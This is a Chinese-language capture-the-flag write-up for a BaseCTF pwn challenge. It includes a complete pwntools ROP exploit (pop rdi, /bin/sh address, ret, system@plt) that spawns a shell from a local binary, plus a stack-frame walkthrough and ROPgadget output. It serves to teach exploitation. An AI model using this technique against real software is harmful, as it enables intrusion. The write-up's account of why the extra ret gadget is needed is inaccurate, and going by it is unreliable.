# Basectf pwn方向“我把她丢了”

by Maple

简单的栈溢出ROP题目，题上已经给了system和/bin/sh的字符串,只需要做一个组合就好。

在64位中，函数的参数是利用寄存器传递的，而第一个参数一般是存放在rdi中的,所以我们先用pop rdi ret把bin/sh字符串地址放在rdi然后再调用system函数即可，调用使用函数的plt表

```python
from pwn import *
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
context(os='linux', arch='amd64',log_level = 'debug')

p = process("./wbtdl")
elf = ELF('./wbtdl')


pop_rdi = 0x401196
binsh = 0x402008
ret = 0x40101a
shell = elf.plt['system']
payload = b'a'*0x78+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(shell)

p.sendline(payload)

p.interactive()
```

这里依次解释一下payload构造的每一项的作用

## pop_rdi

首先要知道，在x86-64架构下，rdi寄存器用于传递第一个整数或指针参数给函数。而pop_rdi一般是在堆叠溢出漏洞时用于设置函数调用的第一个参数，在这里pop_rdi的作用是从栈顶弹出一个值并将其放入rdi寄存器中

## ret

ret指令在这里起到一个“跳板”的作用，确保程序可以按照预期的顺序执行和函数调用，也就是在执行pop_rdi将binsh的地址弹出到rdi寄存器后，通过ret返回到system函数

不加会怎么样：

如果不使用ret指令，直接在pop_rdi后面跟system函数的地址，那么在执行完pop_rdi后，PC会直接跳转到system函数，而不是从栈中弹出返回地址，这会导致system函数的参数传递不正确

## 栈帧分析

`payload = payload = b'a'*0x78+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(shell)`

1. 初始状态的栈状态如下

```C
[ ... ]  <- 堆栈顶
[ 返回地址 ]  <- 被溢出覆盖
```

2. 填充120字节的`a`后，覆盖栈上的返回地址

```c
[ ... ]  <- 堆栈顶
[ 0x401196 ]  <- pop_rdi gadget地址
[ 0x402008 ]  <- /bin/sh字符串地址
[ 0x40101a ]  <- ret指令地址
[ 0x401050 ]  <- system函数地址
```

3. 执行pop_rdi gadget后，栈顶弹出binsh地址，并放入rdi寄存器

```c
[ ... ]  <- 堆栈顶
[ 0x40101a ]  <- ret指令地址
[ 0x401050 ]  <- system函数地址
```

4. ret指令被弹出，跳转到该地址执行

```c
[ ... ]  <- 堆栈顶
[ 0x401050 ]  <- system函数地址
```

5. 执行system函数，ret指令从栈中弹出0x401050地址。于是system函数被调用，因为bin/sh的地址存放于rdi中，所以system调用rdi中的地址就是调用了bin/sh，从而执行了bin/sh

## pop_rdi和ret地址的搜索

在有ROPgadget的情况下可以直接

`ROPgadget --binary <filename> -only "pop|ret"`

例如：

```c
linux> ROPgadget --binary wbtdl --only "pop|ret"

Gadgets information
============================================================
0x000000000040117d : pop rbp ; ret
0x0000000000401196 : pop rdi ; ret
0x000000000040101a : ret

Unique gadgets found: 3
```

